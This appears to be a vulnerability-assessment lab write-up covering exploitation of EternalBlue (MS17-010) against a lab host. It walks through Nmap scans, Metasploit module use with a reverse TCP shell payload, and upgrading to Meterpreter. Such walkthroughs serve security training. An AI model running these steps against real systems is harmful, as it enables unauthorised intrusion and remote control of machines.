Defend

EternalBlue is a critical SMBv1 remote code execution vulnerability discovered by the NSA and publicly disclosed in 2017. It allows an unauthenticated attacker to execute arbitrary code with SYSTEM-level privileges by sending specially crafted packets to port 445. This write-up documents reconnaissance through exploitation and post-exploitation on the target machine.

![image alt](https://github.com/zieksyahmi/VA-Lab-Work/blob/0d97215d2ed1cbcf935eac02df58dbd4c8d0b08d/image/Screenshot%202026-06-07%20030750.png)

Nmap service scan
An initial full-port service scan was performed to enumerate open services.

    nmap -sV -sC -p- --open T4 10.48.143.7

![IMAGE ALT](https://github.com/zieksyahmi/VA-Lab-Work/blob/cae0bf5f0cb904a6ea2d34939fe654b051434400/image/Screenshot%202026-06-07%20030803.png)

Launch Metasploit and search for the module
Opened msfconsole and searched for the EternalBlue exploit module.

The Nmap smb-vuln-ms17-010 script was run to confirm exploitability

    nmap -p 445 --script smb-vuln-ms17-010 10.48.143.7

![image alt](https://github.com/zieksyahmi/VA-Lab-Work/blob/df44dd800638c40c7af83ec709ce72a188efa34c/image/Screenshot%202026-06-07%20030818.png)

msf > search ms17-010

![image alt](https://github.com/zieksyahmi/VA-Lab-Work/blob/6d37c87ca72157e4eaee989cccb565592de36c34/image/Screenshot%202026-06-07%20030834.png)

et the target host and payload.

![image alt](https://github.com/zieksyahmi/VA-Lab-Work/blob/4d31cdc811d1f18e96833f07c1c1284750ae9cc3/image/Screenshot%202026-06-07%20030846.png)

set RHOST 10.48.143.7
set payload windows/x64/shell/reverse_tcp

![image alt](https://github.com/zieksyahmi/VA-Lab-Work/blob/4a65d60707e328c133d37e80996ded15086649ea/image/Screenshot%202026-06-07%20030904.png)

![image alt](https://github.com/zieksyahmi/VA-Lab-Work/blob/78236f139c32b69ba79c7513d8ce9ad25e1c6f48/image/Screenshot%202026-06-07%20030917.png)

The shell session was upgraded to a full Meterpreter session for richer post-exploitation capability.

    use post/multi/manage/shell_to_meterpreter
    set SESSION 1
    run

![image alt](https://github.com/zieksyahmi/VA-Lab-Work/blob/4591338f03d81b01369759cfc99e472948afcc53/image/Screenshot%202026-06-07%20031027.png)

![image alt](https://github.com/zieksyahmi/VA-Lab-Work/blob/d50bce36e58a0862da95a47df5be717f2935864a/image/Screenshot%202026-06-07%20031036.png)

![image alt](https://github.com/zieksyahmi/VA-Lab-Work/blob/febb227337dc05422ecaf30077330ba8b6939280/image/Screenshot%202026-06-07%20031044.png)

![image alt](https://github.com/zieksyahmi/VA-Lab-Work/blob/e404181f7fe03e5d6909390536e3c970984ab80d/image/Screenshot%202026-06-07%20031049.png)
